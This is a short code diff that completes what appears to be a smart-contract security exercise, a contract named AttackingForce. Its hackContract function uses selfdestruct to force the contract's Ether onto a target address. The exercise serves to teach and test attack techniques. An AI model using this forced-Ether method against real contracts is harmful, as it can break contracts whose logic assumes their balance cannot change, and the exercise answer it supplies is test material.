@@ -10,6 +10,11 @@ contract AttackingForce {
     }
 
     function hackContract() external {
-        // Code me!
+        /*
+            Function "selfdestruct" deletes a contract from the blockchain
+            and sends all remain Ether stored in the contract to another address.
+        */
+        address payable victim = payable(address(contractAddress));
+        selfdestruct(victim);
     }
 }
